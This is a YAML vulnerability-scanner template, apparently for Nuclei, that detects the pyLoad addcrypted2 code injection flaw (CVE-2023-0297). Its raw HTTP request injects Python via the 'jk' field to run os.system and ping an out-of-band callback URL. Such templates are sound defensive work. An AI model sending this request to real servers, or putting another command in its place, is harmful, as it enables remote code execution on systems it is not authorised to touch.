id: pyload-addcrypted2-rce
info:
  name: pyload addcrypted2 RCE (CVE-2023-0297)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    pyload is a free open source download manager written in Python, designed to be extremely lightweight, easily extensible and fully manageable over the web.

    There is a code injection vulnerability in pyload/pyload 0.5.0b3.dev31 and earlier versions, which is due to the fact that attackers can implement code injection.
  tags:
    - rce
  classification:
    cve-id: CVE-2023-0297
  reference:
    - https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d

variables:
  check_str: '{{rand_base(4)}}'
  check_url: 'http://{{interactsh-url}}'

http:
  - raw:
      - |
        POST /flash/addcrypted2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        jk=pyimport os;os.system("ping -c 1 {{check_url}}");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
    stop-at-first-match: true
